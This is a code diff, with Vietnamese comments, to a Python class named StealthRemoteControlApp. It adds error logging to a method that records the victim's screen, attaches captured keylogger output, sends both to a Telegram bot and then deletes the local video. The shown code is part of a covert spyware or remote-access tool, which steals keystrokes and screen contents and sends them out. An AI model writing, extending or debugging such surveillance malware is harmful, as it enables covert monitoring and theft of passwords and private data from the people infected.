@@ -244,8 +244,23 @@ class StealthRemoteControlApp:
     def record_and_send_with_keylog(self):
         """Quay màn hình, gửi video và keylog kèm theo về Telegram"""
         try:
+            # Log bắt đầu quay
+            try:
+                log_file = os.path.join(TEMP_DIR, "error.log")
+                os.makedirs(TEMP_DIR, exist_ok=True)
+                with open(log_file, 'a', encoding='utf-8') as f:
+                    f.write(f"[{datetime.now()}] [INFO] Bắt đầu quay màn hình và gửi video...\n")
+            except:
+                pass
+            
             # Kiểm tra internet trước khi quay
             if not self.internet_checker.is_online():
+                try:
+                    log_file = os.path.join(TEMP_DIR, "error.log")
+                    with open(log_file, 'a', encoding='utf-8') as f:
+                        f.write(f"[{datetime.now()}] [ERROR] Không có internet trước khi quay\n")
+                except:
+                    pass
                 return False
             
             # Lấy thông tin máy tính
@@ -258,9 +273,22 @@ class StealthRemoteControlApp:
             duration = RECORD_DURATION
             
             # Quay màn hình (mất khoảng 20 giây)
+            try:
+                log_file = os.path.join(TEMP_DIR, "error.log")
+                with open(log_file, 'a', encoding='utf-8') as f:
+                    f.write(f"[{datetime.now()}] [INFO] Đang quay màn hình {duration} giây...\n")
+            except:
+                pass
+            
             video_path = record_screen(duration=duration)
             
             if not video_path or not os.path.exists(video_path):
+                try:
+                    log_file = os.path.join(TEMP_DIR, "error.log")
+                    with open(log_file, 'a', encoding='utf-8') as f:
+                        f.write(f"[{datetime.now()}] [ERROR] Không thể tạo video hoặc file không tồn tại\n")
+                except:
+                    pass
                 return False
             
             # Kiểm tra lại internet sau khi quay (có thể mất kết nối trong lúc quay)
@@ -268,6 +296,9 @@ class StealthRemoteControlApp:
                 try:
                     if os.path.exists(video_path):
                         os.remove(video_path)
+                    log_file = os.path.join(TEMP_DIR, "error.log")
+                    with open(log_file, 'a', encoding='utf-8') as f:
+                        f.write(f"[{datetime.now()}] [ERROR] Mất internet sau khi quay, đã xóa video\n")
                 except:
                     pass
                 return False
@@ -276,6 +307,18 @@ class StealthRemoteControlApp:
             keylog_content = ""
             if self.keylogger:
                 keylog_content = self.keylogger.get_log_content() or ""
+            
+            # Kiểm tra bot
+            if not self.telegram.bot:
+                try:
+                    if os.path.exists(video_path):
+                        os.remove(video_path)
+                    log_file = os.path.join(TEMP_DIR, "error.log")
+                    with open(log_file, 'a', encoding='utf-8') as f:
+                        f.write(f"[{datetime.now()}] [ERROR] Telegram bot chưa được khởi tạo\n")
+                except:
+                    pass
+                return False
             
             # Gửi video qua Telegram
             if self.telegram.bot and self.internet_checker.is_online():
@@ -297,6 +340,15 @@ class StealthRemoteControlApp:
                     if len(keylog_content) > 3500:
                         caption += f"\n... (truncated, total: {len(keylog_content)} chars)"
                 
+                # Log trước khi gửi
+                try:
+                    log_file = os.path.join(TEMP_DIR, "error.log")
+                    file_size = os.path.getsize(video_path) / (1024 * 1024)  # MB
+                    with open(log_file, 'a', encoding='utf-8') as f:
+                        f.write(f"[{datetime.now()}] [INFO] Đang gửi video ({file_size:.2f} MB)...\n")
+                except:
+                    pass
+                
                 # Gửi video ngay lập tức
                 video_success = self.telegram.send_video_sync(
                     video_path,
@@ -308,6 +360,9 @@ class StealthRemoteControlApp:
                     try:
                         if os.path.exists(video_path):
                             os.remove(video_path)
+                        log_file = os.path.join(TEMP_DIR, "error.log")
+                        with open(log_file, 'a', encoding='utf-8') as f:
+                            f.write(f"[{datetime.now()}] [SUCCESS] Đã gửi video thành công!\n")
                     except:
                         pass
                     return True
@@ -316,6 +371,9 @@ class StealthRemoteControlApp:
                     try:
                         if os.path.exists(video_path):
                             os.remove(video_path)
+                        log_file = os.path.join(TEMP_DIR, "error.log")
+                        with open(log_file, 'a', encoding='utf-8') as f:
+                            f.write(f"[{datetime.now()}] [ERROR] Gửi video thất bại (xem telegram_error.log để biết chi tiết)\n")
                     except:
                         pass
                     return False
@@ -324,6 +382,9 @@ class StealthRemoteControlApp:
                 try:
                     if os.path.exists(video_path):
                         os.remove(video_path)
+                    log_file = os.path.join(TEMP_DIR, "error.log")
+                    with open(log_file, 'a', encoding='utf-8') as f:
+                        f.write(f"[{datetime.now()}] [ERROR] Không có bot hoặc internet để gửi video\n")
                 except:
                     pass
                 return False
@@ -333,6 +394,11 @@ class StealthRemoteControlApp:
             try:
                 if 'video_path' in locals() and os.path.exists(video_path):
                     os.remove(video_path)
+                log_file = os.path.join(TEMP_DIR, "error.log")
+                with open(log_file, 'a', encoding='utf-8') as f:
+                    f.write(f"[{datetime.now()}] [FATAL ERROR] Exception trong record_and_send_with_keylog: {type(e).__name__}: {e}\n")
+                    import traceback
+                    f.write(traceback.format_exc() + "\n")
             except:
                 pass
             return False
